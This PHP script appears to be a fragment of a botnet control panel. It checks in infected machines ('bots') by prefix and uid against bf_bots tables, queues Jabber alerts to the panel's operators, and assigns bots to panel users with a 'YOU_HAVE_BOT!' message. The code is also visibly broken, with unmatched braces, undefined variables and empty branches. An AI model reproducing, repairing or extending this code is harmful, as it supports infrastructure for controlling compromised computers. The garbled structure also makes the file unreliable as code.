<?php

$debag = false;
$dir = str_replace('/scripts/set', '', str_replace('\\', '/', realpath('.'))) . '/';

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';

include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.get_config.php');

$cfg_db = get_config();

require_once($dir . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0) print_data('DB_ERROR!', true);

if(!empty($_POST['id']) && empty($_GET['id'])){
	$matches = explode('0', $_POST['id'], 2);
	if(!empty($matches[0]) && !empty($matches[1])){
		$_POST['prefix'] = $matches[0];
		$_POST['uid'] = '0' . $matches[1];
	}else{
		$_POST['prefix'] = 'UNKNOWN';
		$_POST['uid'] = '0123456789';
	}

	if(empty($_POST['prefix']) || empty($_POST['uid'])) no_found();

	$_POST['prefix'] = strtoupper($_POST['prefix']);
	$_POST['uid'] = strtoupper($_POST['uid']);

	if(!preg_match('~^([a-zA-Z]+)$~', $_POST['prefix']) || !preg_match('~^([a-zA-Z0-9]+)$~', $_POST['uid'])) no_found();

	$bot = $mysqli->query('SELECT id,prefix,uid FROM bf_bots WHERE (prefix = \''.$_POST['prefix'].'\') AND (uid = \''.$_POST['uid'].'\') LIMIT 1');

	if($bot->prefix == $_POST['prefix'] && $bot->uid == $_POST['uid']){
	   	$c = $mysqli->query('SELECT comment FROM bf_comments WHERE (prefix = \''.$_POST['prefix'].'\') AND (uid = \''.$_POST['uid'].'\') AND (type = \'10\') LIMIT 1');

        $send = true;
		}

		if($send == true){

			foreach($uh as $user){
				if(!empty($c->comment)) $text .= 'Comment: ' . $c->comment;
				@file_put_contents($dir . 'cache/jabber/to_' . $user->config->jabber . '_' . mt_rand(5, 15) . time(), $text);
			}
		}

		print($config['hunter']);
	}else{
	}
}elseif(!empty($_GET['id'])){
    $_GET['bid'] = (int) $_GET['bid'];

	$bot = $mysqli->query('SELECT id,post_id FROM bf_bots WHERE (id = \''.$_GET['bid'].'\') LIMIT 1');
    ;
	if($bot->id == $_GET['bid']){

		if($user->id == $_GET['id']){
			if($user->config['sbbc'] == true){
					$mysqli->query('update bf_bots_ip set post_id = \''.$user->id.'\' WHERE (prefix = \''.$bot->prefix.'\') AND  (uid = \''.$bot->uid.'\')');
					print_data('YOU_HAVE_BOT!<br><a href="http://' . $_SERVER['HTTP_HOST'] . '/bots/bot-'.$bot->id.'.html" target="_blank">Посмотреть информацию о боте</a>', true);
				}else{
				}
			}else{
			}
		}else{
		}
	}else{
		print_data('BOT_NOT_FOUND!', true);
	}
}

?>